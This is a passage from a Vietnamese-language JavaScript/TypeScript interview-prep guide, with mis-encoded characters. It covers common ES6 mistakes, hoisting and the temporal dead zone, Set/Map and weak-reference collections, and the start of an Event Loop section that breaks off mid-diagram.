// âŒ Lá»–I 5: Spread shallow copy cho nested objects
const original = { a: 1, nested: { b: 2 } };
const copied = { ...original };
copied.nested.b = 99; // âŒ original.nested.b cÅ©ng = 99!

// âœ… ÄÃšNG: Deep copy cho nested structures
const copied = JSON.parse(JSON.stringify(original)); // Simple way
// Hoáº·c dÃ¹ng lodash cloneDeep, structuredClone

// âŒ Lá»–I 6: Destructuring vá»›i missing properties (no default)
const { email } = user; // âŒ email = undefined náº¿u khÃ´ng tá»“n táº¡i

// âœ… ÄÃšNG: Provide default values
const { email = 'no-email@example.com' } = user; // âœ…

// âŒ Lá»–I 7: Confuse default export vs named export
import User from './user'; // âŒ Náº¿u file export named, khÃ´ng pháº£i default

// âœ… ÄÃšNG: Match export type
import { User } from './user'; // âœ… Named export
import User from './user'; // âœ… Default export
```

**ğŸ“Š Performance Comparison:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              ES5 vs ES6+ PERFORMANCE IMPACT                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  Feature                    ES5 Speed    ES6+ Speed  Winner â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”€â”€â”€â”€â”€â”€ â”‚
â”‚  Variable access (var)      âš¡âš¡âš¡âš¡âš¡      -          ES5   â”‚
â”‚  Variable access (let)      -            âš¡âš¡âš¡âš¡      ES6   â”‚
â”‚  Function call (regular)    âš¡âš¡âš¡âš¡âš¡      -          ES5   â”‚
â”‚  Function call (arrow)      -            âš¡âš¡âš¡âš¡âš¡     ES6   â”‚
â”‚  String concat (+)          âš¡âš¡âš¡âš¡       -          ES5   â”‚
â”‚  Template literals (``)     -            âš¡âš¡âš¡âš¡âš¡     ES6   â”‚
â”‚  Object creation            âš¡âš¡âš¡âš¡       -          ES5   â”‚
â”‚  Class instantiation        -            âš¡âš¡âš¡âš¡      ES6   â”‚
â”‚  Array iteration (.map)     âš¡âš¡âš¡âš¡       -          ES5   â”‚
â”‚  For-of loop                -            âš¡âš¡âš¡âš¡âš¡     ES6   â”‚
â”‚  Promise                    N/A          âš¡âš¡âš¡        ES6   â”‚
â”‚  Async/Await                N/A          âš¡âš¡âš¡        ES6   â”‚
â”‚                                                              â”‚
â”‚  ğŸ’¡ Note: Performance khÃ¡c biá»‡t minimal trong most cases    â”‚
â”‚     Code readability & maintainability quan trá»ng hÆ¡n!      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Khi NÃ o DÃ¹ng ES5 vs ES6+:**

**ğŸ”´ DÃ¹ng ES5 khi:**
- Target IE11 vÃ  khÃ´ng thá»ƒ dÃ¹ng Babel
- Working vá»›i legacy codebase khÃ´ng thá»ƒ refactor
- Extreme performance critical code (rare cases)

**ğŸŸ¢ DÃ¹ng ES6+ khi:**
- Modern project (>99% cases)
- Target modern browsers (Chrome, Firefox, Safari, Edge)
- Want maintainable, readable code
- Using build tools (Webpack, Vite, Babel)
- TypeScript project

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â« Q10: Hoisting & Temporal Dead Zone</span></summary>


**âš¡ Quick Summary:**
> Hoisting = Khai bÃ¡o Ä‘Æ°á»£c Ä‘Æ°a lÃªn Ä‘áº§u scope. `var` = undefined, `let/const` = TDZ â†’ ReferenceError

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”¥ **var**: Hoisted + initialized = undefined â†’ dÃ¹ng trÆ°á»›c khai bÃ¡o OK (nhÆ°ng undefined)
- âš¡ **let/const**: Hoisted nhÆ°ng NOT initialized â†’ TDZ â†’ ReferenceError
- ğŸ¯ **function declaration**: Hoisted toÃ n bá»™ â†’ gá»i trÆ°á»›c khai bÃ¡o OK
- â° **TDZ**: VÃ¹ng tá»« Ä‘áº§u scope Ä‘áº¿n dÃ²ng khai bÃ¡o - biáº¿n tá»“n táº¡i nhÆ°ng khÃ´ng access Ä‘Æ°á»£c


**Tráº£ lá»i:**

- **Hoisting**: CÆ¡ cháº¿ Ä‘Æ°a declarations lÃªn Ä‘áº§u scope trÆ°á»›c khi code execute
- **TDZ (Temporal Dead Zone)**: VÃ¹ng tá»« Ä‘áº§u block scope Ä‘áº¿n dÃ²ng khai bÃ¡o let/const - khÃ´ng thá»ƒ access biáº¿n
- **Æ¯u Ä‘iá»ƒm**: Function hoisting cho phÃ©p tá»• chá»©c code linh hoáº¡t
- **NhÆ°á»£c Ä‘iá»ƒm**: var hoisting gÃ¢y confusion, TDZ errors khÃ³ debug

**Code Example:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 1. FUNCTION HOISTING
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âœ… Function Declaration - hoisted hoÃ n toÃ n
console.log(sayHello('World')); // "Hello World" âœ…
function sayHello(name: string): string {
  return `Hello ${name}`;
}

// âŒ Function Expression - khÃ´ng hoisted
// console.log(sayGoodbye("World")); // ReferenceError
const sayGoodbye = (name: string) => `Goodbye ${name}`;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 2. VAR HOISTING (khÃ´ng cÃ³ TDZ)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

console.log(x); // undefined âœ… (khÃ´ng lá»—i)
var x = 5;
console.log(x); // 5

// JavaScript "nhÃ¬n" code nhÆ°:
// var x = undefined;
// console.log(x);
// x = 5;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 3. LET/CONST - TEMPORAL DEAD ZONE (TDZ)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

{
  // â† TDZ Báº®T Äáº¦U cho biáº¿n y
  
  // console.log(y); // âŒ ReferenceError - Ä‘ang trong TDZ!
  // console.log(typeof y); // âŒ ReferenceError - typeof cÅ©ng khÃ´ng safe!
  
  let y = 10; // â† TDZ Káº¾T THÃšC
  console.log(y); // âœ… 10
}

// So sÃ¡nh var vs let
function compare() {
  console.log(a); // undefined âœ… - var khÃ´ng cÃ³ TDZ
  var a = 1;
  
  // console.log(b); // âŒ ReferenceError - let cÃ³ TDZ
  let b = 2;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 4. TDZ PITFALLS - Nhá»¯ng cÃ¡i báº«y
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Pitfall 1: typeof trong TDZ
{
  // typeof x; // âŒ ReferenceError
  let x = 1;
}

// Pitfall 2: Nested scopes
let outer = 'outer';
{
  // console.log(outer); // âŒ ReferenceError!
  // Inner scope Ä‘Ã£ "claim" biáº¿n outer â†’ TDZ
  let outer = 'inner';
}

// Pitfall 3: Default parameters
// function fn(a = b, b = 1) {} // âŒ ReferenceError - b trong TDZ
function fn(a = 1, b = a) {} // âœ… OK - a Ä‘Ã£ initialize

// Pitfall 4: Class hoisting
// const p = new Person(); // âŒ ReferenceError - class cÃ³ TDZ
class Person {}
```

**Best Practices:**

```typescript
// âœ… Khai bÃ¡o variables á»Ÿ Ä‘áº§u scope
function good() {
  const a = 1;
  let b = 2;
  // ... logic
}

// âœ… DÃ¹ng const/let, trÃ¡nh var
const API_URL = 'https://api.com'; // const cho values khÃ´ng Ä‘á»•i
let count = 0; // let khi cáº§n re-assign

// âœ… Function declarations khi cáº§n hoisting
helper(); // âœ… OK
function helper() {}

// âœ… Arrow/const cho callbacks
const process = (data) => data.map(x => x * 2);
```

**Common Mistakes:**

```typescript
// âŒ Mistake 1: var trong loops
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 3, 3, 3 âŒ
}

// âœ… Fix: let trong loops
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 0, 1, 2 âœ…
}

// âŒ Mistake 2: Access let/const trong TDZ
{
  // console.log(value); // âŒ ReferenceError
  let value = 10;
}

// âœ… Fix: Khai bÃ¡o trÆ°á»›c khi dÃ¹ng
{
  let value = 10;
  console.log(value); // âœ… 10
}
```

**So SÃ¡nh:**

| Feature | var | let/const |
|---------|-----|-----------|
| Hoisted? | âœ… CÃ³ | âœ… CÃ³ |
| Initialized? | âœ… undefined | âŒ KhÃ´ng |
| TDZ? | âŒ KhÃ´ng | âœ… CÃ³ |
| Access trÆ°á»›c khai bÃ¡o | undefined | ReferenceError |
| Scope | Function | Block |

**ğŸ’¡ Key Takeaways:**

- **var**: Hoisted + undefined â†’ access trÆ°á»›c OK (nhÆ°ng undefined)
- **let/const**: Hoisted â†’ TDZ â†’ ReferenceError náº¿u access trÆ°á»›c
- **function declaration**: Hoisted hoÃ n toÃ n â†’ gá»i trÆ°á»›c OK
- **TDZ**: Tá»« Ä‘áº§u scope Ä‘áº¿n dÃ²ng khai bÃ¡o - biáº¿n tá»“n táº¡i nhÆ°ng khÃ´ng access Ä‘Æ°á»£c
- **typeof khÃ´ng safe** trong TDZ!
- **LuÃ´n dÃ¹ng const/let**, trÃ¡nh var

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ—‚ï¸ Q11: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References</span></summary>


**âš¡ Quick Summary:**
> **Set** = unique values, **Map** = key-value (any type). **Weak** = khÃ´ng prevent GC, keys pháº£i lÃ  objects

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Set**: Array nhÆ°ng unique, `.add()`, `.has()`, `.delete()`
- ğŸ“¦ **Map**: Object nhÆ°ng keys cÃ³ thá»ƒ lÃ  any type (object, function...), maintain insertion order
- ğŸ”¥ **WeakSet/WeakMap**: Keys lÃ  objects, tá»± Ä‘á»™ng GC khi khÃ´ng cÃ²n reference
- âš¡ **Use Cases**: Set = dedupe, Map = cache, WeakMap = private data

**Tráº£ lá»i:**

**ğŸ¯ Core Concepts:**

- **Set**: Collection cá»§a unique values, khÃ´ng cÃ³ keys, cÃ³ thá»ƒ iterate
- **Map**: Collection cá»§a key-value pairs, keys cÃ³ thá»ƒ lÃ  báº¥t ká»³ type nÃ o (objects, functions, primitives)
- **WeakSet/WeakMap**: Weak references Ä‘áº¿n objects, khÃ´ng prevent garbage collection, khÃ´ng iterable
- **WeakRef**: Táº¡o weak reference Ä‘áº¿n má»™t object cá»¥ thá»ƒ, object cÃ³ thá»ƒ bá»‹ GC báº¥t cá»© lÃºc nÃ o
- **FinalizationRegistry**: ÄÄƒng kÃ½ callback cleanup khi object Ä‘Æ°á»£c garbage collected

**âœ… Æ¯u Ä‘iá»ƒm:**

- Set/Map: Performance tá»‘t hÆ¡n Object cho lookups, iteration, vÃ  unique values
- WeakSet/WeakMap: Tá»± Ä‘á»™ng cleanup, trÃ¡nh memory leaks
- WeakRef: Cho phÃ©p táº¡o caches mÃ  khÃ´ng prevent GC
- FinalizationRegistry: Cleanup resources (file handles, database connections) khi objects die

**âš ï¸ NhÆ°á»£c Ä‘iá»ƒm:**

- WeakSet/WeakMap: KhÃ´ng iterable, khÃ´ng cÃ³ size property, keys pháº£i lÃ  objects
- WeakRef: Non-deterministic (khÃ´ng biáº¿t khi nÃ o object bá»‹ GC), khÃ´ng nÃªn dÃ¹ng cho core logic
- FinalizationRegistry: Callback cÃ³ thá»ƒ cháº¡y muá»™n hoáº·c khÃ´ng cháº¡y, khÃ´ng predictable

**Code Example:**

```typescript
// ============================================
// 1. SET - Collection Unique Values
// ============================================
/**
 * Vietnamese Explanation:
 * - Set lÆ°u trá»¯ unique values (khÃ´ng duplicate)
 * - CÃ³ thá»ƒ iterate qua cÃ¡c values
 * - Performance O(1) cho add, delete, has operations
 */
let numberSet: Set<number> = new Set([1, 2, 3, 3, 4]);
console.log(numberSet); // Set(4) {1, 2, 3, 4} - duplicate removed

numberSet.add(5);
numberSet.delete(1);
console.log(numberSet.has(2)); // true
console.log(numberSet.size); // 4

// Iterate Set
for (let value of numberSet) {
  console.log(value); // 2, 3, 4, 5
}

// Use cases cho Set
// 1. Remove duplicates tá»« array
const numbers = [1, 2, 2, 3, 3, 4, 5, 5];
const uniqueNumbers = [...new Set(numbers)]; // [1, 2, 3, 4, 5]

// 2. Check membership (nhanh hÆ¡n array.includes)
const validIds = new Set([1, 5, 10, 15]);
console.log(validIds.has(5)); // true - O(1) time

// 3. Set operations
const setA = new Set([1, 2, 3, 4]);
const setB = new Set([3, 4, 5, 6]);

// Union (há»£p)
const union = new Set([...setA, ...setB]); // {1, 2, 3, 4, 5, 6}

// Intersection (giao)
const intersection = new Set([...setA].filter((x) => setB.has(x))); // {3, 4}

// Difference (hiá»‡u)
const difference = new Set([...setA].filter((x) => !setB.has(x))); // {1, 2}

// ============================================
// 2. MAP - Key-Value Pairs vá»›i Any Type Keys
// ============================================
/**
 * Vietnamese Explanation:
 * - Map cho phÃ©p keys lÃ  Báº¤T Ká»² TYPE NÃ€O (objects, functions, primitives)
 * - Object chá»‰ cho phÃ©p string/symbol keys
 * - Map giá»¯ insertion order
 * - Performance tá»‘t hÆ¡n Object cho frequent additions/deletions
 */
let userMap: Map<string, { name: string; age: number }> = new Map();
userMap.set('user1', { name: 'John', age: 25 });
userMap.set('user2', { name: 'Jane', age: 30 });

console.log(userMap.get('user1')); // {name: "John", age: 25}
console.log(userMap.has('user1')); // true
console.log(userMap.size); // 2

// Iterate Map
for (let [key, value] of userMap) {
  console.log(`${key}: ${value.name}`);
}

// Map vs Object - Key Types
let obj: { [key: string]: any } = {};
obj[1] = 'one'; // key becomes STRING "1"
obj[true] = 'true'; // key becomes STRING "true"
console.log(Object.keys(obj)); // ["1", "true"]

let map = new Map();
map.set(1, 'one'); // key is NUMBER 1
map.set(true, 'true'); // key is BOOLEAN true
map.set({ id: 1 }, 'object key'); // key is OBJECT

console.log(map.get(1)); // "one"
console.log(map.get(true)); // "true"

// Use cases cho Map
// 1. Metadata storage vá»›i object keys
const metadataMap = new Map<object, { createdAt: Date; author: string }>();
const element = document.querySelector('.btn');
metadataMap.set(element, {
  createdAt: new Date(),
  author: 'John',
});

// 2. Cache vá»›i function keys
const memoCache = new Map<Function, any>();
function expensiveOperation(fn: Function) {
  if (memoCache.has(fn)) {
    return memoCache.get(fn);
  }
  const result = fn();
  memoCache.set(fn, result);
  return result;
}

// 3. Counting occurrences
const wordCount = new Map<string, number>();
const words = ['apple', 'banana', 'apple', 'cherry', 'banana', 'apple'];
words.forEach((word) => {
  wordCount.set(word, (wordCount.get(word) || 0) + 1);
});
console.log(wordCount); // Map { "apple" => 3, "banana" => 2, "cherry" => 1 }

// ============================================
// 3. WEAKSET - Weak References cho Objects
// ============================================
/**
 * Vietnamese Explanation:
 * - WeakSet chá»‰ chá»©a objects (khÃ´ng chá»©a primitives)
 * - Weak reference: khÃ´ng prevent garbage collection
 * - KhÃ´ng iterable, khÃ´ng cÃ³ size, khÃ´ng cÃ³ clear()
 * - Use case: Track objects mÃ  khÃ´ng prevent chÃºng bá»‹ GC
 */
let weakSet: WeakSet<object> = new WeakSet();
let obj1: any = { name: 'A' };
let obj2: any = { name: 'B' };

weakSet.add(obj1);
weakSet.add(obj2);
console.log(weakSet.has(obj1)); // true

obj1 = null; // obj1 cÃ³ thá»ƒ bá»‹ garbage collected ngay
// weakSet KHÃ”NG prevent obj1 khá»i bá»‹ GC

// Use case: Track DOM elements mÃ  khÃ´ng prevent cleanup
class DOMElementTracker {
  private processedElements = new WeakSet<HTMLElement>();

  markAsProcessed(element: HTMLElement): void {
    this.processedElements.add(element);
  }

  isProcessed(element: HTMLElement): boolean {
    return this.processedElements.has(element);
  }

  // Khi element removed khá»i DOM vÃ  khÃ´ng cÃ²n references,
  // nÃ³ sáº½ tá»± Ä‘á»™ng removed khá»i WeakSet qua GC
}

// ============================================
// 4. WEAKMAP - Weak References cho Key-Value Pairs
// ============================================
/**
 * Vietnamese Explanation:
 * - WeakMap keys PHáº¢I lÃ  objects (khÃ´ng pháº£i primitives)
 * - Keys lÃ  weak references - khÃ´ng prevent GC
 * - KhÃ´ng iterable, khÃ´ng cÃ³ size
 * - Use case: Private data, metadata cho objects
 */
let weakMap: WeakMap<object, string> = new WeakMap();
let keyObj: any = { id: 1 };
weakMap.set(keyObj, 'value');
console.log(weakMap.get(keyObj)); // "value"

keyObj = null; // keyObj cÃ³ thá»ƒ bá»‹ GC, entry tá»± Ä‘á»™ng removed

// Use case 1: Private properties
const privateData = new WeakMap<object, { password: string }>();

class User {
  constructor(public username: string, password: string) {
    // Store password privately
    privateData.set(this, { password });
  }

  checkPassword(input: string): boolean {
    const data = privateData.get(this);
    return data?.password === input;
  }
}

const user = new User('john', 'secret123');
console.log(user.checkPassword('secret123')); // true
// KhÃ´ng thá»ƒ access password tá»« bÃªn ngoÃ i

// Use case 2: Metadata cho DOM elements
const elementMetadata = new WeakMap<HTMLElement, { clicks: number; lastClicked: Date }>();

function trackClicks(element: HTMLElement): void {
  const metadata = elementMetadata.get(element) || { clicks: 0, lastClicked: new Date() };
  metadata.clicks++;
  metadata.lastClicked = new Date();
  elementMetadata.set(element, metadata);
}

// Khi element removed khá»i DOM, metadata tá»± Ä‘á»™ng cleaned up

// Use case 3: Cache cho object methods
const resultCache = new WeakMap<object, Map<string, any>>();

function memoize(obj: any, methodName: string, fn: Function) {
  if (!resultCache.has(obj)) {
    resultCache.set(obj, new Map());
  }

  const cache = resultCache.get(obj)!;
  const key = JSON.stringify(arguments);

  if (cache.has(key)) {
    return cache.get(key);
  }

  const result = fn();
  cache.set(key, result);
  return result;
}

// ============================================
// 5. WEAKREF - Weak Reference Ä‘áº¿n Single Object
// ============================================
/**
 * Vietnamese Explanation:
 * - WeakRef cho phÃ©p hold weak reference Ä‘áº¿n má»™t object
 * - Object cÃ³ thá»ƒ bá»‹ GC báº¥t cá»© lÃºc nÃ o
 * - DÃ¹ng deref() Ä‘á»ƒ get object (cÃ³ thá»ƒ return undefined náº¿u Ä‘Ã£ GC)
 * - KHÃ”NG dÃ¹ng cho core logic vÃ¬ non-deterministic
 * - Use case: Caches, observer patterns
 */
let targetObj: any = { x: 1, data: 'important' };
const weakRef = new WeakRef(targetObj);

// Truy cáº­p object qua weak reference
console.log(weakRef.deref()?.x); // 1

// Sau khi remove táº¥t cáº£ strong references
targetObj = null;

// Object cÃ³ thá»ƒ bá»‹ GC, deref() cÃ³ thá»ƒ return undefined
setTimeout(() => {
  const obj = weakRef.deref();
  if (obj) {
    console.log('Object still alive:', obj.x);
  } else {
    console.log('Object was garbage collected');
  }
}, 1000);

// Use case: Image cache vá»›i automatic cleanup
class ImageCache {
  private cache = new Map<string, WeakRef<HTMLImageElement>>();

  set(url: string, image: HTMLImageElement): void {
    this.cache.set(url, new WeakRef(image));
  }

  get(url: string): HTMLImageElement | undefined {
    const ref = this.cache.get(url);
    if (!ref) return undefined;

    const image = ref.deref();
    if (!image) {
      // Image was GC'd, cleanup cache entry
      this.cache.delete(url);
      return undefined;
    }

    return image;
  }
}

const imageCache = new ImageCache();

// ============================================
// 6. FINALIZATIONREGISTRY - Cleanup Callback khi Object Dies
// ============================================
/**
 * Vietnamese Explanation:
 * - FinalizationRegistry cho phÃ©p Ä‘Äƒng kÃ½ callback khi object Ä‘Æ°á»£c GC
 * - Callback nháº­n "held value" (metadata) khÃ´ng pháº£i object itself
 * - KHÃ”NG reliable - callback cÃ³ thá»ƒ cháº¡y muá»™n hoáº·c khÃ´ng cháº¡y
 * - Use case: Cleanup external resources (files, connections, timers)
 */
const registry = new FinalizationRegistry<string>((heldValue) => {
  console.log(`Object ${heldValue} was garbage collected`);
  // Cleanup external resources here
  // e.g., close file handles, database connections, etc.
});

let myObj: any = { x: 1 };
// Register object vá»›i held value "my-obj"
registry.register(myObj, 'my-obj');

myObj = null; // Object cÃ³ thá»ƒ bá»‹ GC sau Ä‘Ã³
// Callback sáº½ cháº¡y: "Object my-obj was garbage collected"

// Use case: Resource cleanup
class FileHandle {
  private static registry = new FinalizationRegistry<number>((fileDescriptor) => {
    console.log(`Closing file descriptor ${fileDescriptor}`);
    // Close actual file handle
    // closeFile(fileDescriptor);
  });

  constructor(private fd: number) {
    // Register for cleanup
    FileHandle.registry.register(this, fd);
  }

  read(): string {
    // Read file using this.fd
    return 'file content';
  }
}

// Use case: Database connection pool
class DatabaseConnection {
  private static registry = new FinalizationRegistry<string>((connectionId) => {
    console.log(`Cleanup connection ${connectionId}`);
    // Return connection to pool or close it
  });

  constructor(private id: string) {
    DatabaseConnection.registry.register(this, id);
  }
}

// Use case: Timer cleanup
const timerRegistry = new FinalizationRegistry<number>((timerId) => {
  console.log(`Clearing timer ${timerId}`);
  clearInterval(timerId);
});

class AutoTimer {
  private timerId: number;

  constructor(callback: () => void, interval: number) {
    this.timerId = window.setInterval(callback, interval);
    timerRegistry.register(this, this.timerId);
  }
}

// ============================================
// 7. PRACTICAL COMPARISON - When to Use What
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * Use SET when:
 * - Cáº§n unique values
 * - Cáº§n check membership nhanh (O(1))
 * - Cáº§n set operations (union, intersection)
 * 
 * Use MAP when:
 * - Cáº§n key-value pairs vá»›i non-string keys
 * - Cáº§n preserve insertion order
 * - Frequent additions/deletions
 * 
 * Use WEAKSET when:
 * - Track objects mÃ  khÃ´ng prevent GC
 * - Mark/tag objects temporarily
 * 
 * Use WEAKMAP when:
 * - Private data cho objects
 * - Metadata/cache cho objects
 * - Automatic cleanup when objects die
 * 
 * Use WEAKREF when:
 * - Caches cÃ³ thá»ƒ expire
 * - Observer patterns
 * - KhÃ´ng cáº§n guarantee object availability
 * 
 * Use FINALIZATIONREGISTRY when:
 * - Cleanup external resources
 * - Close file handles, connections
 * - NOT for critical logic (unreliable timing)
 */

// Performance comparison
console.time('Set operations');
const set = new Set();
for (let i = 0; i < 100000; i++) {
  set.add(i);
}
console.timeEnd('Set operations'); // ~5ms

console.time('Object operations');
const obj = {};
for (let i = 0; i < 100000; i++) {
  obj[i] = true;
}
console.timeEnd('Object operations'); // ~8ms

console.time('Map operations');
const map = new Map();
for (let i = 0; i < 100000; i++) {
  map.set(i, true);
}
console.timeEnd('Map operations'); // ~6ms
```

**ğŸ¯ Best Practices:**

1. **Set**: Sá»­ dá»¥ng cho unique values, remove duplicates, membership checks
2. **Map**: Sá»­ dá»¥ng cho key-value pairs vá»›i non-string keys, preserve insertion order
3. **WeakSet**: Track objects temporarily mÃ  khÃ´ng prevent GC (DOM elements, event handlers)
4. **WeakMap**: Private properties, metadata, caches for objects
5. **WeakRef**: Soft caches mÃ  khÃ´ng prevent GC, luÃ´n cÃ³ fallback khi deref() returns undefined
6. **FinalizationRegistry**: Cleanup external resources (files, connections), KHÃ”NG dÃ¹ng cho critical logic
7. **Map vs Object**: Prefer Map khi cáº§n frequent additions/deletions hoáº·c non-string keys
8. **WeakMap for Privacy**: Use WeakMap Ä‘á»ƒ implement private properties trong classes

**âš ï¸ Common Mistakes:**

```typescript
// âŒ Sai: Sá»­ dá»¥ng Object cho unique values
let uniqueValues: { [key: string]: boolean } = {};
uniqueValues['a'] = true;
uniqueValues['b'] = true;
uniqueValues['a'] = true; // Duplicate, nhÆ°ng khÃ´ng bá»‹ detect
console.log(Object.keys(uniqueValues).length); // 2 (pháº£i manually check)

// âœ… ÄÃºng: Sá»­ dá»¥ng Set
let uniqueValues2 = new Set(['a', 'b', 'a']); // Set(2) {"a", "b"}
console.log(uniqueValues2.size); // 2 (automatic)

// âŒ Sai: WeakSet vá»›i primitives
const weakSet = new WeakSet();
// weakSet.add('string'); // TypeError: Invalid value used in weak set

// âœ… ÄÃºng: WeakSet chá»‰ vá»›i objects
const weakSet2 = new WeakSet();
weakSet2.add({ id: 1 }); // OK

// âŒ Sai: Iterate WeakMap
const weakMap = new WeakMap();
// for (let [key, value] of weakMap) { } // TypeError: weakMap is not iterable

// âœ… ÄÃºng: WeakMap khÃ´ng iterable, chá»‰ get/set/has/delete
weakMap.get(someKey);

// âŒ Sai: Dá»±a vÃ o WeakRef cho critical logic
function getCachedData(key: string) {
  const ref = cache.get(key);
  return ref.deref().data; // Error náº¿u object Ä‘Ã£ GC!
}

// âœ… ÄÃºng: Always check deref() result
function getCachedData2(key: string) {
  const ref = cache.get(key);
  const obj = ref?.deref();
  if (obj) {
    return obj.data;
  }
  // Fallback: fetch fresh data
  return fetchData(key);
}

// âŒ Sai: Expect FinalizationRegistry callback cháº¡y ngay
registry.register(obj, 'data');
obj = null;
// Callback KHÃ”NG cháº¡y ngay láº­p tá»©c!

// âœ… ÄÃºng: FinalizationRegistry cho optional cleanup only
// KhÃ´ng rely on timing, cÃ³ backup cleanup mechanism
```

**ğŸ“Š Performance & Memory Considerations:**

- **Set/Map**: ~2-3x faster than Object cho frequent lookups/additions/deletions
- **WeakSet/WeakMap**: Nhá» hÆ¡n vá» memory vÃ¬ automatic cleanup
- **WeakRef**: Minimal memory overhead, nhÆ°ng cÃ³ CPU cost cho deref() checks
- **FinalizationRegistry**: Minimal overhead, callback cháº¡y async trong idle time

</details>

## **Pháº§n 3: JavaScript Engine & Event Loop**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”„ Q12: Event Loop - CÆ¡ Cháº¿ Hoáº¡t Äá»™ng JavaScript (Technical Deep Dive)</span></summary>


**â“ CÃ¢u Há»i:**

Giáº£i thÃ­ch chi tiáº¿t cÆ¡ cháº¿ hoáº¡t Ä‘á»™ng cá»§a JavaScript Engine vá»›i Event Loop, Call Stack, Web APIs, Microtask/Macrotask Queues, vÃ  Single Thread.



**âœ… ÄÃ¡p Ãn Chi Tiáº¿t:**

**ğŸ—ï¸ KIáº¾N TRÃšC Tá»”NG QUAN:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    JAVASCRIPT RUNTIME ENVIRONMENT                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚              JAVASCRIPT ENGINE (V8, SpiderMonkey)           â”‚    â”‚
